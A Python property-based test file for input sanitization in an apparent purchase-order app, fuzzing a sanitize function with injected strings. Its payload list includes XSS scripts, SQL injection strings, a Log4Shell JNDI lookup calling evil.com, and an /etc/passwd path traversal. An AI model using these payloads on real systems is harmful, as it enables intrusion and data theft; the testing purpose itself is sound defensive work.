"""
Property-Based Test for Input Sanitization
Feature: reconcile-ai, Property 42: Input Sanitization

Property 42: For any user input (PO data, search queries, approval comments),
the system should sanitize it to remove or escape special characters that could
cause injection attacks.

Validates: Requirements 18.5
"""

import pytest
from hypothesis import given, strategies as st, settings
import re


# Copy of sanitization functions from index.py to avoid boto3 initialization
def sanitize_input(value):
    """
    Sanitize user input to prevent injection attacks.
    Removes or escapes special characters.
    """
    if value is None:
        return None
    
    if isinstance(value, str):
        # Remove control characters and potential injection patterns
        value = re.sub(r'[\x00-\x1f\x7f-\x9f]', '', value)
        
        # Remove dangerous JavaScript patterns (case-insensitive)
        dangerous_patterns = [
            r'javascript:',
            r'data:text/html',
            r'vbscript:',
            r'on\w+\s*=',  # Event handlers like onclick=, onerror=, onload=
        ]
        for pattern in dangerous_patterns:
            value = re.sub(pattern, '', value, flags=re.IGNORECASE)
        
        # Escape common injection characters
        value = value.replace('<', '&lt;').replace('>', '&gt;')
        value = value.replace('"', '&quot;').replace("'", '&#39;')
        return value.strip()
    
    return value


def sanitize_po_data(po_data):
    """Sanitize all string fields in PO data"""
    sanitized = {}
    
    for key, value in po_data.items():
        if isinstance(value, str):
            sanitized[key] = sanitize_input(value)
        elif isinstance(value, list):
            sanitized[key] = [sanitize_line_item(item) for item in value]
        else:
            sanitized[key] = value
    
    return sanitized


def sanitize_line_item(item):
    """Sanitize line item fields"""
    sanitized = {}
    for key, value in item.items():
        if isinstance(value, str):
            sanitized[key] = sanitize_input(value)
        else:
            sanitized[key] = value
    return sanitized


def validate_po(po_data):
    """
    Validate PO has all required fields.
    Returns (is_valid, error_message)
    """
    required_fields = ['vendorName', 'poNumber', 'lineItems']
    
    for field in required_fields:
        if field not in po_data or not po_data[field]:
            return False, f"Missing required field: {field}"
    
    # Validate line items
    line_items = po_data.get('lineItems', [])
    if not isinstance(line_items, list) or len(line_items) == 0:
        return False, "lineItems must be a non-empty array"
    
    for idx, item in enumerate(line_items):
        required_item_fields = ['itemDescription', 'quantity', 'unitPrice']
        for field in required_item_fields:
            if field not in item or item[field] is None:
                return False, f"Line item {idx + 1} missing required field: {field}"
        
        # Validate numeric fields
        try:
            quantity = int(item['quantity'])
            if quantity <= 0:
                return False, f"Line item {idx + 1} quantity must be positive"
        except (ValueError, TypeError):
            return False, f"Line item {idx + 1} quantity must be a valid number"
        
        try:
            unit_price = float(item['unitPrice'])
            if unit_price < 0:
                return False, f"Line item {idx + 1} unitPrice must be non-negative"
        except (ValueError, TypeError):
            return False, f"Line item {idx + 1} unitPrice must be a valid number"
    
    return True, None


# Strategy for generating potentially malicious strings
@st.composite
def malicious_strings(draw):
    """Generate strings with injection attack patterns"""
    base_string = draw(st.text(min_size=1, max_size=100))
    
    # Add various injection patterns
    injection_patterns = [
        '<script>alert("xss")</script>',
        '"; DROP TABLE users; --',
        "' OR '1'='1",
        '<img src=x onerror=alert(1)>',
        '${jndi:ldap://evil.com/a}',
        '../../../etc/passwd',
        '\x00\x01\x02\x03',  # Control characters
        '<iframe src="evil.com">',
        'javascript:alert(1)',
        '"><script>alert(1)</script>',
    ]
    
    pattern = draw(st.sampled_from(injection_patterns))
    
    # Randomly insert pattern into base string
    position = draw(st.integers(min_value=0, max_value=len(base_string)))
    result = base_string[:position] + pattern + base_string[position:]
    
    return result


# Feature: reconcile-ai, Property 42: Input Sanitization
@given(malicious_input=malicious_strings())
@settings(max_examples=100)
@pytest.mark.property_test
def test_input_sanitization_removes_dangerous_characters(malicious_input):
    """
    Property 42: For any user input containing potentially malicious patterns,
    the sanitize_input function should remove or escape dangerous characters.
    
    Validates: Requirements 18.5
    """
    sanitized = sanitize_input(malicious_input)
    
    # Assert that dangerous patterns are escaped or removed
    assert '<script>' not in sanitized.lower(), "Script tags should be escaped"
    assert '<iframe' not in sanitized.lower(), "Iframe tags should be escaped"
    assert 'javascript:' not in sanitized.lower(), "JavaScript protocol should be escaped"
    
    # Assert that HTML special characters are escaped
    if '<' in malicious_input:
        assert '&lt;' in sanitized or '<' not in sanitized, "< should be escaped"
    if '>' in malicious_input:
        assert '&gt;' in sanitized or '>' not in sanitized, "> should be escaped"
    if '"' in malicious_input:
        assert '&quot;' in sanitized or '"' not in sanitized, '" should be escaped'
    if "'" in malicious_input:
        assert '&#39;' in sanitized or "'" not in sanitized, "' should be escaped"
    
    # Assert that control characters are removed
    for char in malicious_input:
        if ord(char) < 32 or (127 <= ord(char) <= 159):
            assert char not in sanitized, f"Control character {repr(char)} should be removed"


# Feature: reconcile-ai, Property 42: Input Sanitization
@given(
    vendor_name=malicious_strings(),
    po_number=st.text(min_size=1, max_size=50),
    item_description=malicious_strings()
)
@settings(max_examples=100)
@pytest.mark.property_test
def test_po_data_sanitization_completeness(vendor_name, po_number, item_description):
    """
    Property 42: For any PO data with potentially malicious input,
    all string fields should be sanitized.
    
    Validates: Requirements 18.5
    """
    po_data = {
        'vendorName': vendor_name,
        'poNumber': po_number,
        'lineItems': [
            {
                'itemDescription': item_description,
                'quantity': 10,
                'unitPrice': 100.0
            }
        ]
    }
    
    sanitized = sanitize_po_data(po_data)
    
    # Assert all string fields are sanitized
    assert '<script>' not in sanitized['vendorName'].lower()
    assert '<script>' not in sanitized['lineItems'][0]['itemDescription'].lower()
    
    # Assert numeric fields are preserved
    assert sanitized['lineItems'][0]['quantity'] == 10
    assert sanitized['lineItems'][0]['unitPrice'] == 100.0


# Feature: reconcile-ai, Property 42: Input Sanitization
@given(
    search_query=st.one_of(
        malicious_strings(),
        st.text(min_size=0, max_size=100)
    )
)
@settings(max_examples=100)
@pytest.mark.property_test
def test_search_query_sanitization(search_query):
    """
    Property 42: For any search query input, the system should sanitize it
    to prevent SQL injection or NoSQL injection attacks.
    
    Validates: Requirements 18.5
    """
    sanitized = sanitize_input(search_query)
    
    # Assert SQL injection patterns are escaped
    if sanitized:
        # Common SQL injection patterns should be escaped or neutralized
        dangerous_patterns = [
            "'; DROP TABLE",
            "' OR '1'='1",
            "'; --",
            "' OR 1=1",
        ]
        
        for pattern in dangerous_patterns:
            if pattern.lower() in search_query.lower():
                # After sanitization, quotes should be escaped
                assert "'" not in sanitized or '&#39;' in sanitized


# Feature: reconcile-ai, Property 42: Input Sanitization
@given(
    comment=st.one_of(
        malicious_strings(),
        st.text(min_size=0, max_size=500)
    )
)
@settings(max_examples=100)
@pytest.mark.property_test
def test_approval_comment_sanitization(comment):
    """
    Property 42: For any approval or rejection comment, the system should
    sanitize it to prevent XSS attacks when displayed in the UI.
    
    Validates: Requirements 18.5
    """
    sanitized = sanitize_input(comment)
    
    if sanitized:
        # XSS patterns should be escaped
        xss_patterns = [
            '<script>',
            '<iframe',
            'javascript:',
            'onerror=',
            'onload=',
        ]
        
        for pattern in xss_patterns:
            assert pattern.lower() not in sanitized.lower(), \
                f"XSS pattern '{pattern}' should be escaped or removed"


# Feature: reconcile-ai, Property 42: Input Sanitization
@given(
    po_data=st.fixed_dictionaries({
        'vendorName': st.text(min_size=1, max_size=100),
        'poNumber': st.text(min_size=1, max_size=50),
        'lineItems': st.lists(
            st.fixed_dictionaries({
                'itemDescription': st.text(min_size=1, max_size=200),
                'quantity': st.integers(min_value=1, max_value=1000),
                'unitPrice': st.floats(min_value=0.01, max_value=10000.0, allow_nan=False, allow_infinity=False)
            }),
            min_size=1,
            max_size=10
        )
    })
)
@settings(max_examples=100)
@pytest.mark.property_test
def test_sanitization_preserves_valid_data(po_data):
    """
    Property 42: For any valid PO data without malicious content,
    sanitization should preserve the data integrity while ensuring safety.
    
    Validates: Requirements 18.5
    """
    # Sanitize the data
    sanitized = sanitize_po_data(po_data)
    
    # Validate that the PO is still valid after sanitization
    is_valid, error_message = validate_po(sanitized)
    
    # If original data was valid structure, sanitized should maintain validity
    assert 'vendorName' in sanitized
    assert 'poNumber' in sanitized
    assert 'lineItems' in sanitized
    assert len(sanitized['lineItems']) == len(po_data['lineItems'])
    
    # Numeric values should be unchanged
    for i, item in enumerate(sanitized['lineItems']):
        assert item['quantity'] == po_data['lineItems'][i]['quantity']
        assert item['unitPrice'] == po_data['lineItems'][i]['unitPrice']


if __name__ == '__main__':
    # Run tests with pytest
    pytest.main([__file__, '-v', '--tb=short'])
